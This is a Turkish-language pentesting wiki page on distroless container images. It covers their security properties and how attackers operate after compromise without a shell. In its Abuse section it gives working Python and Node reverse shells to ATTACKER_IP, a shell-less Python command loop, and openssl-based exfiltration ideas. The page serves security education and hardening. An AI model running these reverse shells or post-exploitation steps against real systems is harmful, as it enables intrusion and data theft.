# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

**distroless** container image, tek bir uygulamayı çalıştırmak için gereken **minimum runtime bileşenlerini** içeren ve package manager'lar, shell'ler ve geniş kapsamlı genel userland araçları gibi alışılagelmiş distribution araçlarını kasıtlı olarak kaldıran bir image'dır. Pratikte distroless image'lar çoğunlukla yalnızca uygulama binary'sini veya runtime'ını, paylaşılan library'leri, certificate bundle'larını ve çok küçük bir filesystem düzenini içerir.

Buradaki amaç, distroless'in yeni bir kernel isolation primitive olması değildir. Distroless bir **image design strategy**'sidir. Container filesystem'inin **içinde** nelerin kullanılabilir olduğunu değiştirir; kernel'in container'ı nasıl izole ettiğini değiştirmez. Bu ayrım önemlidir, çünkü distroless ortamı esas olarak code execution elde ettikten sonra bir attacker'ın kullanabileceği şeyleri azaltarak harden eder. Namespaces, seccomp, capabilities, AppArmor, SELinux veya başka bir runtime isolation mekanizmasının yerini almaz.

## Distroless Neden Var?

Distroless image'lar temel olarak şunları azaltmak için kullanılır:

- image boyutu
- image'ın operational complexity'si
- vulnerability içerebilecek package ve binary sayısı
- varsayılan olarak bir attacker'ın kullanabileceği post-exploitation tool sayısı

Distroless image'ların production application deployment'larında popüler olmasının nedeni budur. Shell, package manager ve neredeyse hiç genel amaçlı tooling içermeyen bir container, genellikle operational olarak daha kolay anlaşılır ve compromise sonrasında interactive olarak abuse edilmesi daha zordur.

İyi bilinen distroless-style image family'lerine örnekler:

- Google's distroless image'ları
- Chainguard hardened/minimal image'ları

## Distroless Ne Anlama Gelmez?

Bir distroless container:

- otomatik olarak rootless değildir
- otomatik olarak non-privileged değildir
- otomatik olarak read-only değildir
- otomatik olarak seccomp, AppArmor veya SELinux tarafından korunmaz
- otomatik olarak container escape'e karşı güvenli değildir

Bir distroless image'ı `--privileged`, host namespace sharing, tehlikeli bind mount'lar veya mount edilmiş bir runtime socket ile çalıştırmak hâlâ mümkündür. Bu senaryoda image minimal olabilir, ancak container yine de catastrophically insecure olabilir. Distroless, **userland attack surface**'ini değiştirir; **kernel trust boundary**'yi değil.

## Tipik Operational Özellikler

Bir distroless container'ı compromise ettiğinizde genellikle ilk fark edeceğiniz şey, yaygın varsayımların artık geçerli olmamasıdır. `sh`, `bash`, `ls`, `id`, `cat` olmayabilir; hatta bazen alışılmış tradecraft'ınızın beklediği şekilde çalışan libc tabanlı bir environment bile bulunmayabilir. Tooling eksikliği debugging, incident response ve post-exploitation süreçlerini farklılaştırdığı için bu durum hem offense hem de defense'i etkiler.

En yaygın pattern'ler şunlardır:

- application runtime vardır, ancak başka çok az şey bulunur
- shell tabanlı payload'lar shell olmadığı için başarısız olur
- helper binary'ler eksik olduğu için yaygın enumeration one-liner'ları başarısız olur
- read-only rootfs veya writable tmpfs konumlarında `noexec` gibi filesystem protection'ları da sıklıkla bulunur

İnsanların genellikle "weaponizing distroless" hakkında konuşmasına yol açan kombinasyon budur.

## Distroless ve Post-Exploitation

Bir distroless environment'daki temel offensive challenge her zaman initial RCE değildir. Çoğu zaman asıl sorun bundan sonra gelir. Exploit edilen workload Python, Node.js, Java veya Go gibi bir language runtime'da code execution sağlıyorsa arbitrary logic çalıştırabilirsiniz; ancak bunu diğer Linux target'larında yaygın olan normal shell-centric workflow'lar üzerinden yapamayabilirsiniz.

Bu, post-exploitation sürecinin genellikle üç yönden birine kaydığı anlamına gelir:

1. Environment'ı enumerate etmek, socket açmak, dosya okumak veya ek payload'ları stage etmek için **mevcut language runtime'ını doğrudan kullanmak**.
2. Filesystem read-only ise veya writable konumlar `noexec` olarak mount edilmişse **kendi tooling'inizi memory'ye getirmek**.
3. Application veya dependency'leri beklenmedik şekilde kullanışlı bir şey içeriyorsa **image'da zaten bulunan binary'leri abuse etmek**.

## Abuse

### Sahip Olduğunuz Runtime'ı Enumerate Edin

Birçok distroless container'da shell yoktur; ancak hâlâ bir application runtime bulunur. Target bir Python service ise Python vardır. Target Node.js ise Node vardır. Bu çoğu zaman `/bin/sh` çağırmadan dosyaları enumerate etmek, environment variable'larını okumak, reverse shell açmak ve in-memory execution stage etmek için yeterli functionality sağlar.

Python ile basit bir örnek:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js ile basit bir örnek:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- environment variables'ın kurtarılması; bunlar çoğunlukla credentials veya service endpoints içerir
- `/bin/ls` olmadan filesystem enumeration
- writable paths ve mounted secrets'ın belirlenmesi

### Reverse Shell Without `/bin/sh`

Image `sh` veya `bash` içermiyorsa classic shell-based reverse shell hemen başarısız olabilir. Bu durumda bunun yerine kurulu language runtime'ını kullanın.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh` mevcut değilse, son satırı doğrudan Python ile komut çalıştırma veya Python REPL döngüsüyle değiştirin.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Yine de `/bin/sh` mevcut değilse, shell başlatmak yerine doğrudan Node'un dosya sistemi, process ve networking API'lerini kullanın.

### Full Example: No-Shell Python Command Loop

Image'da Python varsa ancak hiç shell yoksa, basit bir etkileşimli loop genellikle full post-exploitation capability'yi sürdürmek için yeterlidir:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Bu işlem, etkileşimli bir shell binary'si gerektirmez. Saldırganın bakış açısından etkisi temel bir shell ile fiilen aynıdır: mevcut runtime üzerinden command execution, enumeration ve ek payload'ların staging'i.

### In-Memory Tool Execution

Distroless image'lar genellikle şunlarla birlikte kullanılır:

- `readOnlyRootFilesystem: true`
- `/dev/shm` gibi yazılabilir ancak `noexec` tmpfs
- package management tool'larının bulunmaması

Bu kombinasyon, klasik "binary'yi diske indir ve çalıştır" workflow'larını güvenilmez hâle getirir. Bu durumlarda memory execution teknikleri temel çözüm hâline gelir.

Bunun için ayrılmış sayfa:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Buradaki en ilgili teknikler şunlardır:

- scripting runtime'ları üzerinden `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image İçinde Zaten Bulunan Binary'ler

Bazı distroless image'lar, compromise sonrasında kullanışlı hâle gelen ve operasyonel olarak gerekli binary'leri hâlâ barındırır. Sık gözlemlenen bir örnek `openssl`'dir; çünkü uygulamalar crypto veya TLS ile ilgili görevler için zaman zaman buna ihtiyaç duyabilir.

Hızlı bir arama pattern'i şöyledir:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
`openssl` mevcutsa şu amaçlarla kullanılabilir:

- outbound TLS bağlantıları
- izin verilen bir egress channel üzerinden data exfiltration
- encoded/encrypted blob'lar aracılığıyla payload verilerinin staging işlemi

Kesin abuse, gerçekte hangi bileşenlerin kurulu olduğuna bağlıdır; ancak genel fikir şudur: distroless, "hiçbir araç yok" anlamına gelmez; "normal bir distribution image'a kıyasla çok daha az araç" anlamına gelir.

## Kontroller

Bu kontrollerin amacı, image'ın pratikte gerçekten distroless olup olmadığını ve post-exploitation için hangi runtime veya helper binary'lerinin hâlâ kullanılabilir olduğunu belirlemektir.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Burada ilginç olanlar:

- Shell yoksa ancak Python veya Node gibi bir runtime mevcutsa, post-exploitation runtime-driven execution'a yönelmelidir.
- Root filesystem salt okunursa ve `/dev/shm` yazılabilir ancak `noexec` durumundaysa, memory execution teknikleri çok daha önemli hâle gelir.
- `openssl`, `busybox` veya `java` gibi yardımcı binary'ler mevcutsa, daha ileri erişimi bootstrap etmek için yeterli işlevsellik sunabilirler.

## Runtime Varsayılanları

| Image / platform stili | Varsayılan durum | Tipik davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Google distroless style images | Tasarım gereği minimal userland | Shell yok, package manager yok, yalnızca uygulama/runtime bağımlılıkları var | debugging katmanları, sidecar shell'ler eklemek veya busybox ya da tooling kopyalamak |
| Chainguard minimal images | Tasarım gereği minimal userland | Azaltılmış package yüzeyi, genellikle tek bir runtime veya service'e odaklanır | `:latest-dev` ya da debug varyantlarını kullanmak, build sırasında tool'lar kopyalamak |
| Distroless images kullanan Kubernetes workload'ları | Pod config'e bağlıdır | Distroless yalnızca userland'i etkiler; Pod security posture yine de Pod spec'ine ve runtime varsayılanlarına bağlıdır | ephemeral debug container'ları, host mount'larını veya privileged Pod ayarlarını eklemek |
| Distroless images çalıştıran Docker / Podman | Run flag'lerine bağlıdır | Minimal filesystem, ancak runtime security yine flag'lere ve daemon configuration'a bağlıdır | `--privileged`, host namespace paylaşımı, runtime socket mount'ları, writable host bind'leri |

Temel nokta, distroless'ın bir **image özelliği** olması, runtime protection olmamasıdır. Değeri, compromise sonrasında filesystem içinde kullanılabilir olanları azaltmasından gelir.

## İlgili Sayfalar

Distroless environment'larda yaygın olarak ihtiyaç duyulan filesystem ve memory-execution bypass'ları için:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Distroless workload'larına hâlâ uygulanabilen container runtime, socket ve mount abuse için:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
